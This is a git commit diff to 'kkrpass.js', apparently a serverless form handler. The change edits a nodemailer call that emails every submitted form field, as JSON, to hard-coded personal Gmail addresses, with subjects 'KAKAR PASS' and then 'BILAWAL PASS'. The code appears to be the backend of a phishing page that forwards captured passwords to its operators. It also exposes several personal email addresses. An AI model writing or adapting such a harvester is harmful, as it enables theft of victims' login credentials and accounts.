3e308b413025a0a119b06dd337ad35e7595cba14
mbkhan1122 <malijaan414@gmail.com>
2025-12-10 23:33:47 +0500

    Update kkrpass.js

--- kkrpass.js
+++ kkrpass.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
     // ✅ Send email
     await transporter.sendMail({
       from: `"PROFESSOR" <${process.env.SMTP_USER}>`,
-      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,officialjessica313@gmail.com",
-      subject: "KAKAR PASS",
+      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com",
+      subject: "BILAWAL PASS",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
     });
